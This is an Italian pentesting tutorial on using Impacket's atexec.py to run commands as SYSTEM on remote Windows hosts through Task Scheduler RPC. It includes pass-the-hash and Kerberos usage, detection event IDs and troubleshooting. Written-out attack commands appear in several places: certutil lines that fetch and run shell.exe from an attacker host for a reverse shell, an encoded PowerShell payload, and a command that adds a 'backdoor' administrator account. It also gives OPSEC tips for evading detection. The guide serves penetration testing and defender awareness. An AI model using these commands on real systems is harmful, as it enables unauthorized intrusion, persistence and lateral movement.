---
title: 'Impacket atexec: Esecuzione Remota via Task Scheduler'
slug: atexec
description: >-
  Guida operativa a impacket-atexec: esecuzione remota su Windows via Task
  Scheduler RPC con password, Pass-the-Hash, Kerberos e lateral movement su SMB.
image: /atexec-py-esecuzione-remota-task-scheduler.webp
draft: false
date: 2026-07-22T00:00:00.000Z
categories:
  - tools
subcategories:
  - post-exploit
tags:
  - impacket
  - atexec
  - task scheduler
  - lateral movement
---

# atexec.py — Esecuzione Remota via Task Scheduler con Impacket

`atexec.py` è un tool di [Impacket](https://hackita.it/articoli/impacket/) che ti fa eseguire **un singolo comando alla volta** su una macchina Windows remota, usando le tue credenziali (password, hash NTLM o ticket Kerberos). Non ti dà una shell interattiva: gli dai un comando, quello parte sul target, e ti ritorna solo l'output di quel comando. Poi la connessione finisce. Se vuoi lanciare un altro comando, richiami di nuovo `atexec.py`.

Il modo in cui lo fa: sfrutta il **Task Scheduler** di Windows (lo stesso servizio che gestisce le attività pianificate) da remoto, tramite RPC (protocollo MS-TSCH). In pratica crea una task pianificata sul target che esegue il tuo comando, aspetta che finisca, legge l'output e poi cancella la task. Tutto tramite SMB, quindi ti basta la porta 445 aperta.

A differenza di [psexec.py](https://hackita.it/articoli/psexec/) che crea un servizio Windows, o di [wmiexec.py](https://hackita.it/articoli/wmiexec/) che usa WMI e ti dà qualcosa di più simile a una shell, atexec passa dallo [Scheduled Task](https://hackita.it/articoli/scheduled-task/) — e per questo il comando gira nel contesto `NT AUTHORITY\SYSTEM`, cioè con i massimi privilegi sulla macchina.

Riferimento ufficiale: [Impacket su GitHub — fortra/impacket](https://github.com/fortra/impacket/blob/master/examples/atexec.py)

## Come funziona internamente

Ogni volta che lanci `atexec.py`, il tool fa tutto il ciclo da capo — non c'è sessione persistente, non c'è stato mantenuto tra un comando e l'altro. Ecco cosa succede sul target:

```
1. Connessione SMB su porta 445 → autenticazione
2. Chiamata RPC SchRpcRegisterTask → crea scheduled task con nome random (8 char ASCII)
3. Chiamata RPC SchRpcRun → esegue il task (il tuo comando) come SYSTEM
4. Output del comando → rediretto in %SystemRoot%\Temp\[random].tmp
5. Lettura del file .tmp via ADMIN$ (solo se non usi -silentcommand)
6. Chiamata RPC SchRpcDelete → cancella il task
7. Output stampato a schermo sull'attaccante
```

**Cosa lo distingue dagli altri tool Impacket:**

| Tool                                               | Protocollo                   | Porta      | Tipo output       | Artefatti principali                       |
| -------------------------------------------------- | ---------------------------- | ---------- | ----------------- | ------------------------------------------ |
| `atexec.py`                                        | MS-TSCH (Task Scheduler RPC) | 445        | Singolo comando   | Task scheduler creato/eliminato, file .tmp |
| [wmiexec.py](https://hackita.it/articoli/wmiexec/) | WMI / DCOM                   | 135 + alto | Semi-interattivo  | Processo WMI, nessun servizio              |
| [smbexec.py](https://hackita.it/articoli/smbexec/) | SMB (servizio)               | 445        | Semi-interattivo  | Servizio creato/eliminato                  |
| [psexec.py](https://hackita.it/articoli/psexec/)   | SMB (servizio + exec)        | 445        | Shell interattiva | Servizio + binario su ADMIN$               |
| `dcomexec.py`                                      | DCOM                         | 135 + alto | Semi-interattivo  | Oggetto DCOM istanziato                    |

## Sintassi e opzioni

```bash
impacket-atexec [opzioni] dominio/utente:password@target 'comando'
# oppure
atexec.py [opzioni] dominio/utente:password@target 'comando'
```

| Opzione          | Descrizione                                                            |
| ---------------- | ---------------------------------------------------------------------- |
| `-hashes LM:NT`  | Pass-the-Hash invece di password                                       |
| `-k`             | Autenticazione Kerberos (con ccache)                                   |
| `-no-pass`       | Da usare con `-k`                                                      |
| `-dc-ip IP`      | Specifica IP del Domain Controller                                     |
| `-port PORT`     | Porta SMB (default 445)                                                |
| `-debug`         | Output verboso — utile per troubleshooting                             |
| `-ts`            | Aggiunge timestamp all'output                                          |
| `-silentcommand` | Esegue il comando senza catturarne l'output (niente lettura da ADMIN$) |

**Attenzione con `-silentcommand`:** non avvia `cmd.exe` — esegue direttamente il primo elemento come programma. Operatori come `&&`, pipe o redirect non vengono interpretati. Se ti servono, anteponi esplicitamente `cmd.exe /c`:

```bash
impacket-atexec -silentcommand corp.local/administrator:Pass@10.10.10.5 \
  "cmd.exe /c net user backdoor Passw0rd! /add && net localgroup administrators backdoor /add"
```

## Utilizzo pratico

### Con password in chiaro

```bash
# Esegui comando su host remoto
impacket-atexec corp.local/administrator:Password123@10.10.10.5 'whoami'
impacket-atexec corp.local/administrator:Password123@10.10.10.5 'whoami /priv'
impacket-atexec corp.local/administrator:Password123@10.10.10.5 'ipconfig /all'
impacket-atexec corp.local/administrator:Password123@10.10.10.5 'net user /domain'
impacket-atexec corp.local/administrator:Password123@10.10.10.5 'net group "Domain Admins" /domain'

# Autenticazione locale (workgroup o local admin)
impacket-atexec ./administrator:Password123@10.10.10.5 'whoami'
```

### Pass-the-Hash

Con l'NT hash ottenuto via [Mimikatz](https://hackita.it/articoli/mimikatz/) o [DCSync](https://hackita.it/articoli/dcsync/) — non serve la password in chiaro:

```bash
# LM hash può essere vuoto (aad3b435...)
impacket-atexec -hashes aad3b435b51404eeaad3b435b51404ee:NThashQUI corp.local/administrator@10.10.10.5 'whoami'

# Shorthand con solo NT hash
impacket-atexec -hashes :NThashQUI corp.local/administrator@10.10.10.5 'whoami'
```

Approfondisci la tecnica in [Pass-the-Hash](https://hackita.it/articoli/pass-the-hash/).

### Kerberos (Pass-the-Ticket)

```bash
export KRB5CCNAME=/path/to/administrator.ccache
impacket-atexec -k -no-pass corp.local/administrator@dc01.corp.local 'whoami'
# ATTENZIONE: usa sempre l'FQDN con Kerberos, non l'IP
```

Se ottieni accesso sufficiente alla memoria di un host (es. [dump del TGT](https://hackita.it/articoli/tgt-kerberos/)), puoi verificare la presenza di ticket Kerberos riutilizzabili e valutare un successivo Pass-the-Ticket con atexec al posto della password.

### Reverse shell tramite atexec

atexec non dà shell interattiva, ma puoi usarlo per triggerare una reverse shell:

```bash
# Esempio: scarica ed esegui payload PowerShell
impacket-atexec corp.local/admin:pass@10.10.10.5 \
  'powershell -enc JABjAGwAaQBlAG4AdA...'

# Oppure con certutil (LOLBin)
impacket-atexec corp.local/admin:pass@10.10.10.5 \
  'certutil -urlcache -split -f http://10.10.14.1/shell.exe C:\Windows\Temp\s.exe && C:\Windows\Temp\s.exe'

# cmd /c per comandi composti
impacket-atexec corp.local/admin:pass@10.10.10.5 \
  'cmd /c dir C:\Users\Administrator\Desktop'
```

### Ricognizione rapida post-accesso

```bash
TARGET="corp.local/administrator:Password123@10.10.10.5"

impacket-atexec $TARGET 'whoami /all'
impacket-atexec $TARGET 'systeminfo'
impacket-atexec $TARGET 'net user /domain'
impacket-atexec $TARGET 'net group "Domain Admins" /domain'
impacket-atexec $TARGET 'netstat -ano'
impacket-atexec $TARGET 'tasklist /v'
impacket-atexec $TARGET 'reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
```

## Confronto con i tool alternativi — quando usare atexec

atexec è la scelta giusta quando:

* Vuoi eseguire **un singolo comando** senza shell interattiva
* Hai solo la **porta 445 aperta** (non 135/WMI)
* Vuoi un'esecuzione che lascia meno tracce di psexec/smbexec (nessun servizio creato)
* Stai automatizzando esecuzione in bulk su più target

Non è la scelta giusta quando:

* Ti serve una shell interattiva → usa [wmiexec.py](https://hackita.it/articoli/wmiexec/) o evil-winrm
* L'ambiente blocca Task Scheduler via RPC → valuta `dcomexec.py` (stesso principio, protocollo DCOM)
* Hai bisogno di output in tempo reale → usa [smbexec.py](https://hackita.it/articoli/smbexec/)

## Requisiti

```
- Credenziali valide: password, NT hash, o TGT Kerberos
- Local admin sul target (o Domain Admin)
- Porta 445/TCP raggiungibile
- Task Scheduler abilitato sul target (default su Windows)
- Share ADMIN$: necessaria per recuperare l'output; non richiesta nelle modalità senza output
```

## Errori comuni e troubleshooting

| Errore                    | Causa                                | Soluzione                       |
| ------------------------- | ------------------------------------ | ------------------------------- |
| `STATUS_LOGON_FAILURE`    | Credenziali errate o account lockout | Verifica creds, aspetta lockout |
| `STATUS_ACCESS_DENIED`    | Non sei local admin                  | Serve admin locale o DA         |
| `STATUS_BAD_NETWORK_NAME` | ADMIN$ non raggiungibile             | Verifica SMB e share admin      |
| Output vuoto              | Task creato ma output non catturato  | Aggiungi `cmd /c` al comando    |
| `rpc_s_access_denied`     | Task Scheduler bloccato da policy    | Prova wmiexec o dcomexec        |
| Timeout                   | Porta 445 bloccata o firewall        | Verifica connettività SMB       |
| Errore Kerberos           | IP invece di FQDN                    | Usa FQDN con `-k`               |

## OPSEC e detection

`atexec` crea il task, lo esegue e successivamente lo elimina — il codice non modifica un task già esistente. Gli eventi principali da correlare sono:

| Event ID        | Log                                         | Cosa indica                                |
| --------------- | ------------------------------------------- | ------------------------------------------ |
| **4698**        | Security                                    | Scheduled task creato (nome random 8 char) |
| **4699**        | Security                                    | Scheduled task eliminato subito dopo       |
| **4624 Type 3** | Security                                    | Autenticazione di rete verso il target     |
| **106**         | Microsoft-Windows-TaskScheduler/Operational | Task registrato (se il canale è abilitato) |

La sequenza 4698 → 4699 a distanza di pochi secondi, con task name random e azione che punta a `%TEMP%\*.tmp`, è un IoC noto. Anche il file `.tmp` in `C:\Windows\Temp\` viene creato e subito letto — rilevabile con Sysmon Event 11 (file creation).

**Nota importante:** gli eventi Security 4698/4699 richiedono che sia configurata la policy **Audit Other Object Access Events** — senza questa policy attiva, questi eventi non vengono generati.

Il timestamp di creazione del task è hardcoded nel codice ufficiale (`2015-07-15T20:35:13.2757294`) ed è un IOC ad alta precisione quando l'ambiente raccoglie l'Event ID 4698 completo del contenuto XML del task.

Riferimento MITRE: [T1053.005 — Scheduled Task](https://attack.mitre.org/techniques/T1053/005/) + [T1021.002 — SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002/)

**Mitigazioni per ridurre il rumore:**

* Preferisci un singolo comando utile invece di più comandi separati — ogni esecuzione genera la stessa sequenza di eventi
* In ambienti con EDR attivo considera [wmiexec.py](https://hackita.it/articoli/wmiexec/) con `--nooutput` o metodi nativi LOLBin

**Su "stealth":** atexec evita la creazione di un servizio (a differenza di psexec/smbexec), ma non è invisibile — genera comunque task con nome casuale, esecuzione come SYSTEM, XML caratteristico e file temporaneo a 8 lettere. Il codice ufficiale conferma questi artefatti, e MITRE include creazione, esecuzione e cancellazione dei task tra i segnali da correlare.

## Cheat Sheet

```bash
# Sintassi base
impacket-atexec DOMAIN/user:pass@TARGET 'cmd'

# Pass-the-Hash
impacket-atexec -hashes :NThash DOMAIN/user@TARGET 'cmd'

# Kerberos
export KRB5CCNAME=ticket.ccache
impacket-atexec -k -no-pass DOMAIN/user@FQDN 'cmd'

# Ricognizione rapida
impacket-atexec DOMAIN/user:pass@TARGET 'whoami /all'
impacket-atexec DOMAIN/user:pass@TARGET 'net group "Domain Admins" /domain'
impacket-atexec DOMAIN/user:pass@TARGET 'systeminfo'

# Debug se non ottieni output
impacket-atexec -debug DOMAIN/user:pass@TARGET 'whoami'

# Reverse shell via LOLBin
impacket-atexec DOMAIN/user:pass@TARGET \
  'certutil -urlcache -split -f http://ATTACKER_IP/shell.exe C:\Windows\Temp\s.exe && C:\Windows\Temp\s.exe'

# Porta custom
impacket-atexec -port 445 DOMAIN/user:pass@TARGET 'cmd'
```

> Uso esclusivo in ambienti autorizzati.

\#impacket #windows
